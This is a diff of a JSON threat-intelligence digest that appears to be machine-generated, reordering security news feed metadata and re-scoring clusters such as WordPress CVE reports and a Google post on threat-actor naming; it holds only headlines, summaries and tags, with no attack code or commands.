@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-07-25T13:48:58.716253+00:00",
+  "generated_at": "2026-07-25T15:09:30.731591+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 76,
-  "total_items_in_window": 309,
-  "total_clusters_raw": 145,
+  "total_items_in_window": 294,
+  "total_clusters_raw": 141,
   "total_clusters_in_packet": 64,
-  "dropped_low_score": 81,
+  "dropped_low_score": 77,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -74,6 +74,13 @@
       "item_count": 10,
       "in_window_count": 0
     },
+    "Microsoft Security Blog": {
+      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "Unit 42": {
       "url": "https://unit42.paloaltonetworks.com/feed/",
       "cohort": "threat_research_primary",
@@ -83,13 +90,6 @@
     },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Microsoft Security Blog": {
-      "url": "https://www.microsoft.com/en-us/security/blog/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
@@ -109,6 +109,13 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Citizen Lab": {
+      "url": "https://citizenlab.ca/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
       "cohort": "threat_research_primary",
@@ -122,41 +129,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 1
-    },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
-    },
-    "Citizen Lab": {
-      "url": "https://citizenlab.ca/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 4
-    },
-    "SANS Internet Storm Center": {
-      "url": "https://isc.sans.edu/rssfeed_full.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
     },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
@@ -172,12 +144,12 @@
       "item_count": 15,
       "in_window_count": 1
     },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 4
+      "item_count": 20,
+      "in_window_count": 2
     },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
@@ -186,32 +158,32 @@
       "item_count": 100,
       "in_window_count": 0
     },
+    "SANS Internet Storm Center": {
+      "url": "https://isc.sans.edu/rssfeed_full.xml",
+      "cohort": "government_authoritative",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 4
+    },
     "Volexity": {
       "url": "https://www.volexity.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
-    },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 78,
-      "in_window_count": 0
-    },
-    "PortSwigger Research": {
-      "url": "https://portswigger.net/research/rss",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 40,
       "in_window_count": 0
     },
     "GitHub Security Lab": {
@@ -221,6 +193,34 @@
       "item_count": 10,
       "in_window_count": 2
     },
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 4
+    },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "PortSwigger Research": {
+      "url": "https://portswigger.net/research/rss",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 40,
+      "in_window_count": 0
+    },
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 78,
+      "in_window_count": 0
+    },
     "Exploit-DB": {
       "url": "https://www.exploit-db.com/rss.xml",
       "cohort": "offensive_vulnerability_research",
@@ -228,18 +228,18 @@
       "item_count": 50,
       "in_window_count": 0
     },
-    "watchTowr Labs": {
-      "url": "https://labs.watchtowr.com/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 0
-    },
     "The DFIR Report": {
       "url": "https://thedfirreport.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
+      "in_window_count": 0
+    },
+    "watchTowr Labs": {
+      "url": "https://labs.watchtowr.com/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 15,
       "in_window_count": 0
     },
     "TrustedSec": {
@@ -298,13 +298,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Huntress": {
-      "url": "https://www.huntress.com/blog/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
       "cohort": "offensive_vulnerability_research",
@@ -319,12 +312,12 @@
       "item_count": 20,
       "in_window_count": 5
     },
-    "Permiso Security": {
-      "url": "https://permiso.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Rapid7": {
       "url": "https://www.rapid7.com/blog/rss/",
@@ -333,19 +326,26 @@
       "item_count": 20,
       "in_window_count": 4
     },
+    "Huntress": {
+      "url": "https://www.huntress.com/blog/rss.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
+    "Permiso Security": {
+      "url": "https://permiso.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
-    },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
     },
     "Sysdig": {
       "url": "https://sysdig.com/feed/",
@@ -382,9 +382,16 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 14
+    },
+    "Chainalysis": {
+      "url": "https://www.chainalysis.com/blog/feed/",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 2
@@ -395,27 +402,6 @@
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
-    },
-    "Chainalysis": {
-      "url": "https://www.chainalysis.com/blog/feed/",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 14
-    },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -431,20 +417,6 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "SecurityWeek": {
-      "url": "https://www.securityweek.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "CyberScoop": {
-      "url": "https://cyberscoop.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
     "GreyNoise": {
       "url": "https://www.greynoise.io/blog/rss.xml",
       "cohort": "cloud_identity_infrastructure",
@@ -452,12 +424,19 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
+      "item_count": 10,
+      "in_window_count": 2
+    },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 15
     },
     "Simon Willison": {
       "url": "https://simonwillison.net/atom/everything/",
@@ -466,12 +445,26 @@
       "item_count": 30,
       "in_window_count": 17
     },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
+    "SecurityWeek": {
+      "url": "https://www.securityweek.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 24
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
+    "CyberScoop": {
+      "url": "https://cyberscoop.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
     },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
@@ -480,19 +473,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
-    },
-    "Schneier on Security": {
-      "url": "https://www.schneier.com/feed/atom/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 6
+      "item_count": 50,
+      "in_window_count": 24
     },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
@@ -508,36 +494,22 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Just Security": {
-      "url": "https://www.justsecurity.org/feed/",
-      "cohort": "policy_strategy_geopolitics",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
+    "Schneier on Security": {
+      "url": "https://www.schneier.com/feed/atom/",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 10,
+      "in_window_count": 6
+    },
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 15,
       "in_window_count": 1
     },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
-    },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -550,8 +522,43 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Reddit r/netsec": {
+      "url": "https://www.reddit.com/r/netsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 50
+    },
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
+    },
     "Reddit r/msp": {
       "url": "https://www.reddit.com/r/msp/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -564,26 +571,19 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/AskNetsec": {
-      "url": "https://www.reddit.com/r/AskNetsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
-    },
     "Intel 471": {
       "url": "https://intel471.com/blog/feed",
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 1
+    },
+    "Reddit r/AskNetsec": {
+      "url": "https://www.reddit.com/r/AskNetsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -592,25 +592,25 @@
       "item_count": 100,
       "in_window_count": 23
     },
-    "Reddit r/netsec": {
-      "url": "https://www.reddit.com/r/netsec/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "Just Security": {
+      "url": "https://www.justsecurity.org/feed/",
+      "cohort": "policy_strategy_geopolitics",
       "status": "ok",
-      "item_count": 25,
-      "in_window_count": 15
-    },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "item_count": 10,
+      "in_window_count": 10
     },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 100,
+      "in_window_count": 1
+    },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
       "in_window_count": 1
     },
     "Risky Business News": {
@@ -774,8 +774,8 @@
     {
       "cluster_id": "56fb338f87",
       "priority_score": 55,
-      "member_count": 10,
-      "corroborating_source_count": 9,
+      "member_count": 8,
+      "corroborating_source_count": 8,
       "strong_signals": [
         "CVE-2026-60137",
         "CVE-2026-63030",
@@ -812,8 +812,7 @@
           "tier_1_government",
           "tier_1_offensive_research",
           "tier_2_operator",
-          "tier_4_news",
-          "tier_5_chatter"
+          "tier_4_news"
         ]
       },
       "primary": {
@@ -1029,38 +1028,6 @@
           }
         },
         {
-          "source": "Reddit r/netsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "wp2shell (CVE-2026-63030): Pre-Auth RCE Chain in WordPress Core - Analysis and Open-Source Scanner",
-          "link": "https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/",
-          "published": "2026-07-18T21:17:40+00:00",
-          "summary": "submitted by /u/mazen160 [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "WordPress"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-63030"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "preauth_unauth"
-            ],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_5_chatter",
-            "role_map": {
-              "WordPress": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
           "source": "The Hacker News",
           "cohort": "cyber_news_breach_reporting",
           "title": "WordPress wp2shell Exploitation Grows as Public Exploit Fuels Mass Scanning",
@@ -1149,116 +1116,6 @@
               "OpenAI/ChatGPT": "target",
               "WordPress": "target"
             },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "f978f91ef1",
-      "priority_score": 26,
-      "member_count": 2,
-      "corroborating_source_count": 2,
-      "strong_signals": [
-        "APT1"
-      ],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [
-          "APT1"
-        ],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research",
-          "tier_2_operator"
-        ]
-      },
-      "primary": {
-        "source": "Google Cloud Threat Intelligence",
-        "cohort": "threat_research_primary",
-        "title": "Updated Cyber Threat Actor Naming System",
-        "link": "https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/",
-        "published": "2026-07-24T14:00:00+00:00",
-        "summary": "Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa",
-        "full_body": "Threat Intelligence Updated Cyber Threat Actor Naming System July 24, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approach, employing memorable two-word combinations for each distinct threat actor: The first word is a unique and memorable term chosen to represent the specific actor, particularly names that may have been used in prior public reporting. If no previously used term exists, this word is randomly generated to remove bias, then vetted by our analysts. The second word categorizes threat clusters by motivation, attribution, or activity type based on which category we consider to be most important for defense and response strategies. The table below provides a sample of how threat actor categories will map to the second word in each cryptonym: Origin or Type Group Name People’s Republic of China CASTLE Iran ION North Korea NEPTUNE Russia RELIC Cybercriminal COMET Table 1: Examples of Google’s new threat actor naming system categories We know there are many threat actor tracking schemas in the industry, so we are intentionally seeking to keep this system as simple as possible to streamline operations and facilitate mapping to other naming taxonomies. However, a significant caveat remains: because no two organizations have the exact same visibility into the threat landscape, direct, apples-to-apples comparisons between threat actors are rarely possible. Transitioning to a convention that is simpler to follow and remember is a practical step toward managing a highly intricate tracking problem. A Work in Progress We have initially prioritized renaming several dozen of the most active groups, and will continue this process on a rolling basis. Previous names will remain indexed and searchable in the Google Threat Intelligence (GTI) platform, with MITRE ATT&CK mappings and other vendor aliases preserved, see Figure 1. Figure 1: Threat actor name appearance in GTI platform on initial rollout We will continue to use UNC, or “uncategorized” designations for threat clusters that are still in the early stages of investigation, as described here . Posted in Threat Intelligence Related articles Threat Intelligence Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management By Mandiant • 20-minute read Threat Intelligence The Risk of Exposed Cloud Functions and How to Harden By Mandiant • 11-minute read Threat Intelligence The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI By Mandiant • 8-minute read Threat Intelligence Google’s Continued Disruption of Malicious Residential Proxy Networks By Google Threat Intelligence Group • 5-minute read",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [
-            "APT1"
-          ],
-          "affected_industries": [],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Google Cloud Threat Intelligence",
-          "cohort": "threat_research_primary",
-          "title": "Updated Cyber Threat Actor Naming System",
-          "link": "https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/",
-          "published": "2026-07-24T14:00:00+00:00",
-          "summary": "Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [
-              "APT1"
-            ],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Google Cloud Security",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "Updated Cyber Threat Actor Naming System",
-          "link": "https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/",
-          "published": "2026-07-24T14:00:00+00:00",
-          "summary": "Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [
-              "APT1"
-            ],
-            "affected_industries": [],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -1610,10 +1467,120 @@
       ]
     },
     {
+      "cluster_id": "f978f91ef1",
+      "priority_score": 25,
+      "member_count": 2,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "APT1"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [
+          "APT1"
+        ],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research",
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Google Cloud Threat Intelligence",
+        "cohort": "threat_research_primary",
+        "title": "Updated Cyber Threat Actor Naming System",
+        "link": "https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/",
+        "published": "2026-07-24T14:00:00+00:00",
+        "summary": "Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approa",
+        "full_body": "Threat Intelligence Updated Cyber Threat Actor Naming System July 24, 2026 Google Threat Intelligence Group Google Threat Intelligence Visibility and context on the threats that matter most. Contact Us & Get a Demo Introduction Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting. Why are we Adopting a Different Naming System? Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems. Our New Schema Our new schema utilizes a cryptonym-based approach, employing memorable two-word combinations for each distinct threat actor: The first word is a unique and memorable term chosen to represent the specific actor, particularly names that may have been used in prior public reporting. If no previously used term exists, this word is randomly generated to remove bias, then vetted by our analysts. The second word categorizes threat clusters by motivation, attribution, or activity type based on which category we consider to be most important for defense and response strategies. The table below provides a sample of how threat actor categories will map to the second word in each cryptonym: Origin or Type Group Name People’s Republic of China CASTLE Iran ION North Korea NEPTUNE Russia RELIC Cybercriminal COMET Table 1: Examples of Google’s new threat actor naming system categories We know there are many threat actor tracking schemas in the industry, so we are intentionally seeking to keep this system as simple as possible to streamline operations and facilitate mapping to other naming taxonomies. However, a significant caveat remains: because no two organizations have the exact same visibility into the threat landscape, direct, apples-to-apples comparisons between threat actors are rarely possible. Transitioning to a convention that is simpler to follow and remember is a practical step toward managing a highly intricate tracking problem. A Work in Progress We have initially prioritized renaming several dozen of the most active groups, and will continue this process on a rolling basis. Previous names will remain indexed and searchable in the Google Threat Intelligence (GTI) platform, with MITRE ATT&CK mappings and other vendor aliases preserved, see Figure 1. Figure 1: Threat actor name appearance in GTI platform on initial rollout We will continue to use UNC, or “uncategorized” designations for threat clusters that are still in the early stages of investigation, as described here . Posted in Threat Intelligence Related articles Threat Intelligence Demystifying AI Exploits: A Blueprint for AI-Assisted Vulnerability Management By Mandiant • 20-minute read Threat Intelligence The Risk of Exposed Cloud Functions and How to Harden By Mandiant • 11-minute read Threat Intelligence The ‘Ghost’ in the Database: Recovering Active ADFS Signing Keys via Machine DPAPI By Mandiant • 8-minute read Threat Intelligence Google’s Continued Disruption of Malicious Residential Proxy Networks By Google Threat Intelligence Group • 5-minute read",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [
+            "APT1"
+          ],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
